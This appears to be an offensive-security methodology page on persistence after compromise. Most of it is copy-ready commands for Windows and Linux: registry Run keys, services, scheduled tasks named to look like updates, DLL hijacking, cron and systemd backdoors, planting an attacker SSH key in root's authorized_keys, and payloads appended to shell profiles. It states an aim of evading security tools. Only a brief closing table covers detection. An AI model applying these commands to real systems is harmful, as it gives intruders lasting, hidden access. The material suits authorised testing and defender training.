---
title: Persistence
category: methodology
tags: [persistence, backdoor, scheduled-tasks]
last_updated: 2025-12-27
---

# Persistence

## Overview

Persistence mechanisms allow attackers to maintain access to a compromised system across reboots, credential changes, and other interruptions. This phase typically follows initial compromise and privilege escalation.

**Key Objectives:**
- Survive system reboots
- Maintain access if credentials are changed
- Establish multiple fallback access methods
- Remain undetected by security tools

---

## Windows Persistence

### Registry Run Keys

```powershell
# Current User (no admin required)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Backdoor" /t REG_SZ /d "C:\path\to\payload.exe"

# Local Machine (requires admin)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Backdoor" /t REG_SZ /d "C:\path\to\payload.exe"

# RunOnce (executes once then deletes)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Backdoor" /t REG_SZ /d "C:\path\to\payload.exe"
```

### Windows Services

```powershell
# Create a new service
sc create backdoor binPath= "C:\path\to\payload.exe" start= auto

# Modify existing service
sc config <service_name> binPath= "C:\path\to\payload.exe"

# Start the service
sc start backdoor
```

### Scheduled Tasks

```powershell
# Create scheduled task (runs at logon)
schtasks /create /tn "SystemUpdate" /tr "C:\path\to\payload.exe" /sc onlogon /ru SYSTEM

# Create scheduled task (runs every hour)
schtasks /create /tn "Maintenance" /tr "C:\path\to\payload.exe" /sc hourly

# PowerShell method
$action = New-ScheduledTaskAction -Execute "C:\path\to\payload.exe"
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger
```

### DLL Hijacking

```powershell
# Find missing DLLs (use Process Monitor)
# Place malicious DLL in application directory or PATH
# Common targets: wlbsctrl.dll, CRYPTBASE.dll
```

---

## Linux Persistence

### Cron Jobs

```bash
# User crontab
crontab -e
# Add: * * * * * /path/to/payload

# System-wide crontab
echo "* * * * * root /path/to/payload" >> /etc/crontab

# Cron directories
echo "#!/bin/bash\n/path/to/payload" > /etc/cron.daily/backdoor
chmod +x /etc/cron.daily/backdoor
```

### Systemd Services

```bash
# Create service file
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Service

[Service]
Type=simple
ExecStart=/path/to/payload
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Enable and start
systemctl daemon-reload
systemctl enable backdoor.service
systemctl start backdoor.service
```

### SSH Keys

```bash
# Add attacker's public key
echo "ssh-rsa AAAA... attacker@host" >> ~/.ssh/authorized_keys

# For root access
echo "ssh-rsa AAAA... attacker@host" >> /root/.ssh/authorized_keys

# Set correct permissions
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh
```

### Bash Profile/RC Files

```bash
# Add to user's profile
echo "/path/to/payload &" >> ~/.bashrc
echo "/path/to/payload &" >> ~/.bash_profile

# System-wide
echo "/path/to/payload &" >> /etc/profile
echo "/path/to/payload &" >> /etc/bash.bashrc
```

---

## Detection Considerations

| Technique | Detection Method |
|-----------|------------------|
| Registry Run Keys | Monitor registry changes |
| Scheduled Tasks | Event ID 4698, 4702 |
| Services | Event ID 7045 |
| Cron Jobs | Monitor /var/spool/cron, /etc/cron* |
| SSH Keys | Monitor authorized_keys changes |
| Systemd | Monitor /etc/systemd/system |
